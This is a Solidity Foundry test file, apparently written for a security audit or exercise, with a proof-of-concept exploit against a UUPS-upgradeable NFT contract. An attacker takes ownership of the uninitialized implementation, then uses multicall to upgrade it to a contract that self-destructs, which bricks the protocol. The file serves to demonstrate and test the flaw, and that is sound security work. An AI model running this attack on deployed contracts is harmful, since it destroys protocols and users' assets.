// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Initializable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol";
import {MulticallUpgradeable} from "../src/libraries/Multicall.sol";

import "openzeppelin-contracts-upgradeable/contracts/utils/StorageSlotUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";

contract HalbornBrickProtocol {
    function initialize() external {
        selfdestruct(payable(address(0xdeadbea7)));
    }
}

contract HalbornFixedNFT is     
    Initializable,
    UUPSUpgradeable,
    OwnableUpgradeable,
    MulticallUpgradeable
{
    // ... simplified for demo
    function initialize() external initializer {
        __UUPSUpgradeable_init();
        __Ownable_init();
        __Multicall_init();
    }

    function _authorizeUpgrade(address) internal override onlyOwner {}
}

contract HalbornTestBrickProtocol is Test {
    HalbornFixedNFT public nft;
    HalbornFixedNFT public impl;

    function setUp() public {
        // We start with the assumption that `onlyOwner` has been added to `_authorizeUpgrade()`
        impl = new HalbornFixedNFT();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl), 
            abi.encodeWithSignature("initialize()")
        );

        nft = HalbornFixedNFT(address(proxy));
    }

    function testBrickProtocol() public {
        address payable attacker = payable(address(0xdeadbea7));
        vm.startPrank(attacker);
        
        // run the initializer on the implementation contract
        // confirm that we are now the owner of the implementation contract
        impl.initialize();
        assertTrue(impl.owner() == attacker);


        // upgrade to our malicious implementation
        HalbornBrickProtocol newImpl = new HalbornBrickProtocol();

        bytes[] memory calls = new bytes[](1);
        bytes memory call1 = abi.encodeWithSignature("upgradeTo(address)", address(newImpl));
        calls[0] = call1;

        impl.multicall(calls);

        // confirm that the implementation contract has been selfdestructed
        // by checking its code size
        assertTrue(address(impl).code.length == 0);


        vm.stopPrank();
    }
}
